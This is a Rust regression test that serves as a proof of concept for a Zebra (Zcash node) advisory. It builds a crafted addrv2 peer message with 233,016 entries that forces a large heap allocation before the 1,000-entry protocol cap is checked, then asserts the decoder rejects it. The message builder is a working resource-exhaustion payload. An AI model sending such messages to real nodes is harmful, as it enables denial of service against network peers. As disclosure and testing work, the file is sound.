//! PoC for GHSA-xr93-pcq3-pxf8: addr/addrv2 deserialization resource exhaustion.
//!
//! A single crafted ~2 MiB `addrv2` wire message forces Zebra to allocate and
//! parse 233,016 entries (~10.7 MiB heap) before the 1,000-entry protocol cap
//! is checked. This test feeds that message through `Codec::decode()` — the
//! exact code path hit by TCP data from a remote peer after handshake.

use std::{io::Write, mem};

use byteorder::{BigEndian, LittleEndian, WriteBytesExt};
use bytes::BytesMut;
use tokio_util::codec::Decoder;

use zebra_chain::{
    parameters::Network,
    serialization::{sha256d, TrustedPreallocate, ZcashDeserialize},
};

use crate::{
    constants::MAX_ADDRS_IN_MESSAGE,
    protocol::external::{
        addr::{AddrV2, ADDR_V2_MIN_SIZE},
        Codec,
    },
};

/// Build a wire-format Zcash `addrv2` message with `count` minimal 9-byte entries.
fn build_attack_message(count: usize) -> Vec<u8> {
    let mut body = Vec::new();

    // CompactSize prefix
    if count < 253 {
        body.write_u8(count as u8).unwrap();
    } else if count <= 0xFFFF {
        body.write_u8(0xFD).unwrap();
        body.write_u16::<LittleEndian>(count as u16).unwrap();
    } else {
        body.write_u8(0xFE).unwrap();
        body.write_u32::<LittleEndian>(count as u32).unwrap();
    }

    for _ in 0..count {
        body.write_u32::<LittleEndian>(0x495FAB29).unwrap(); // timestamp
        body.write_u8(0).unwrap(); // services (CompactSize 0)
        body.write_u8(0xFF).unwrap(); // network_id (unsupported)
        body.write_u8(0).unwrap(); // addr_len (CompactSize 0)
        body.write_u16::<BigEndian>(0).unwrap(); // port
    }

    // Zcash message header: magic(4) + command(12) + len(4) + checksum(4)
    let mut msg = Vec::with_capacity(24 + body.len());
    msg.write_all(&Network::Mainnet.magic().0).unwrap();
    msg.write_all(b"addrv2\0\0\0\0\0\0").unwrap();
    msg.write_u32::<LittleEndian>(body.len() as u32).unwrap();
    msg.write_all(&sha256d::Checksum::from(body.as_slice()).0).unwrap();
    msg.write_all(&body).unwrap();
    msg
}

/// PoC: a single ~2 MiB addrv2 message exercises the full Codec::decode()
/// pipeline and forces a ~10.7 MiB heap allocation before rejection.
#[test]
fn poc_remote_addrv2_resource_exhaustion() {
    let _init_guard = zebra_test::init();

    let attack_count = (2_097_152 - 5) / ADDR_V2_MIN_SIZE; // 233,016
    let raw = build_attack_message(attack_count);
    let heap_bytes = attack_count * mem::size_of::<AddrV2>();

    // Feed through Codec::decode() — the real TCP inbound path
    let mut codec = Codec::builder().finish();
    let mut src = BytesMut::from(raw.as_slice());
    let result = codec.decode(&mut src);

    // 1) max_allocation must not exceed protocol cap
    assert!(
        AddrV2::max_allocation() <= MAX_ADDRS_IN_MESSAGE as u64,
        "max_allocation() is {} — a remote peer can force {:.1} MiB heap allocation",
        AddrV2::max_allocation(),
        heap_bytes as f64 / (1024.0 * 1024.0),
    );

    // 2) message must be rejected
    assert!(result.is_err(), "message with {attack_count} entries was accepted");

    // 3) deserialization layer must reject >1000 entries directly
    let oversized_body = build_attack_message(MAX_ADDRS_IN_MESSAGE + 1);
    // Skip the 24-byte header to get just the body for direct deserialization
    let body_only = &oversized_body[24..];
    assert!(
        Vec::<AddrV2>::zcash_deserialize(body_only).is_err(),
        "Vec<AddrV2>::zcash_deserialize accepted {} entries (protocol cap: {})",
        MAX_ADDRS_IN_MESSAGE + 1,
        MAX_ADDRS_IN_MESSAGE,
    );
}
